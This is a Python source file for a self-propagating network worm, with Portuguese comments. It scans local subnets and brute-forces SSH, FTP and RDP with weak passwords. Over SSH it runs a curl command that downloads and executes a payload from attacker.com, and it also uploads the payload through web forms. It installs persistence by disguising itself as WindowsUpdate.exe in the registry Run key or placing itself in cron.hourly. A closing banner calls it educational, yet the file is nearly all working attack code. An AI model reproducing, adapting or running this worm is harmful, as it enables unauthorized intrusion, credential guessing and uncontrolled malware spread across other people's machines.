#!/usr/bin/env python3
import os
import sys
import socket
import threading
import platform
import subprocess
import time
import hashlib
import requests
import zipfile
import io
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ===== CONFIGURAÇÕES ===== #
SCAN_THREADS = 50
SCAN_PORTS = [21, 22, 80, 443, 3389, 8080]  # Portas comuns para tentar infecção
PAYLOAD_URL = "http://attacker.com/payload.zip"  # URL do payload malicioso
AES_KEY = hashlib.sha256(b"32_byte_secret_key_here!").digest()
AES_IV = b"16_byte_iv_here!"

class AdvancedWorm:
    def __init__(self):
        self.platform = platform.system()
        self.hostname = socket.gethostname()
        self.ip = self.get_local_ip()
        self.signature = f"WORM_{hashlib.sha256(self.hostname.encode()).hexdigest()[:8]}"
        self.infected_hosts = set()
        self.stop_flag = False

    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def encrypt(self, data):
        """Criptografa dados com AES-CBC"""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size)))

    def decrypt(self, encrypted_data):
        """Descriptografa dados com AES-CBC"""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size).decode()

    def propagate_via_ssh(self, host, port=22):
        """Tenta se propagar via SSH (senhas fracas)"""
        if host in self.infected_hosts:
            return False

        common_passwords = ["admin", "password", "123456", "root", "toor"]
        try:
            for password in common_passwords:
                command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no root@{host} 'curl {PAYLOAD_URL} -o /tmp/payload.zip && unzip -o /tmp/payload.zip -d /tmp/ && chmod +x /tmp/payload && /tmp/payload'"
                result = subprocess.run(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=10)
                
                if result.returncode == 0:
                    self.infected_hosts.add(host)
                    print(f"[+] Infectado via SSH: {host}")
                    return True
        except:
            pass
        return False

    def propagate_via_ftp(self, host, port=21):
        """Tenta se propagar via FTP (senhas fracas)"""
        if host in self.infected_hosts:
            return False

        common_passwords = ["admin", "password", "ftp", "anonymous", "user"]
        try:
            for password in common_passwords:
                ftp_script = f"""
                open {host}
                user ftp {password}
                binary
                get {PAYLOAD_URL} payload.zip
                bye
                """
                with open("ftp_script.txt", "w") as f:
                    f.write(ftp_script)
                
                result = subprocess.run("ftp -n < ftp_script.txt", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=15)
                
                if "226 Transfer complete" in result.stdout.decode():
                    self.infected_hosts.add(host)
                    print(f"[+] Infectado via FTP: {host}")
                    return True
        except:
            pass
        return False

    def propagate_via_http(self, host, port=80):
        """Tenta explorar vulnerabilidades web conhecidas"""
        if host in self.infected_hosts:
            return False

        try:
            # Simulação: Exploração de upload arbitrário
            url = f"http://{host}:{port}/upload.php"
            files = {'file': ('payload.zip', requests.get(PAYLOAD_URL).content)}
            response = requests.post(url, files=files, timeout=10)
            
            if response.status_code == 200 and "upload successful" in response.text.lower():
                self.infected_hosts.add(host)
                print(f"[+] Infectado via HTTP: {host}")
                return True
        except:
            pass
        return False

    def propagate_via_rdp(self, host, port=3389):
        """Tenta se propagar via RDP (Windows)"""
        if host in self.infected_hosts or self.platform != "Windows":
            return False

        try:
            # Simulação: Usando credenciais fracas
            command = f"xfreerdp /v:{host} /u:Administrator /p:Password123 +auth-only"
            result = subprocess.run(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=15)
            
            if "Authentication only successful" in result.stdout.decode():
                # Se autenticou, executa o payload remotamente
                self.infected_hosts.add(host)
                print(f"[+] Infectado via RDP: {host}")
                return True
        except:
            pass
        return False

    def scan_and_infect(self, network_prefix):
        """Varre a rede local e tenta infectar hosts vulneráveis"""
        for i in range(1, 255):
            if self.stop_flag:
                return
                
            host = f"{network_prefix}.{i}"
            if host == self.ip:
                continue
                
            for port in SCAN_PORTS:
                if self.stop_flag:
                    return
                    
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    
                    if result == 0:  # Porta aberta
                        if port == 22:
                            self.propagate_via_ssh(host)
                        elif port == 21:
                            self.propagate_via_ftp(host)
                        elif port == 80 or port == 8080:
                            self.propagate_via_http(host, port)
                        elif port == 3389:
                            self.propagate_via_rdp(host)
                            
                    sock.close()
                except:
                    pass

    def start_scanning(self):
        """Inicia threads de varredura em redes locais"""
        threads = []
        
        # Detecta redes locais (simplificado)
        local_ips = [f"192.168.{i}" for i in range(1, 255)]
        
        for network in local_ips:
            if self.stop_flag:
                break
                
            for _ in range(SCAN_THREADS):
                t = threading.Thread(target=self.scan_and_infect, args=(network,))
                t.daemon = True
                t.start()
                threads.append(t)
                
        for t in threads:
            t.join()

    def install_persistence(self):
        """Instala mecanismos de persistência"""
        try:
            if self.platform == "Windows":
                # Copia para AppData
                dest = os.path.join(os.getenv("APPDATA"), "WindowsUpdate.exe")
                if not os.path.exists(dest):
                    shutil.copyfile(sys.argv[0], dest)
                    # Adiciona ao registro
                    subprocess.run(
                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        f'/v "WindowsUpdate" /t REG_SZ /d "{dest}" /f',
                        shell=True,
                        stderr=subprocess.PIPE
                    )
            elif self.platform == "Linux":
                # Adiciona ao crontab
                dest = "/etc/cron.hourly/update"
                if not os.path.exists(dest):
                    shutil.copyfile(sys.argv[0], dest)
                    os.chmod(dest, 0o755)
        except:
            pass

    def download_payload(self):
        """Baixa o payload principal"""
        try:
            response = requests.get(PAYLOAD_URL)
            if response.status_code == 200:
                with zipfile.ZipFile(io.BytesIO(response.content)) as zip_file:
                    zip_file.extractall("/tmp/")
                os.chmod("/tmp/payload", 0o755)
                subprocess.Popen("/tmp/payload", shell=True)
        except:
            pass

    def run(self):
        """Executa o worm"""
        print(f"[*] Worm {self.signature} iniciado em {self.hostname}")
        
        # Fase 1: Persistência
        self.install_persistence()
        
        # Fase 2: Baixar payload (se necessário)
        self.download_payload()
        
        # Fase 3: Propagação
        self.start_scanning()
        
        # Mantém o worm ativo
        while not self.stop_flag:
            time.sleep(60)

if __name__ == "__main__":
    print("""
    ⚠️ AVISO LEGAL:
    Este é um worm simulado para fins educacionais.
    Não use em sistemas sem permissão explícita.
    """)
    
    worm = AdvancedWorm()
    worm.run()
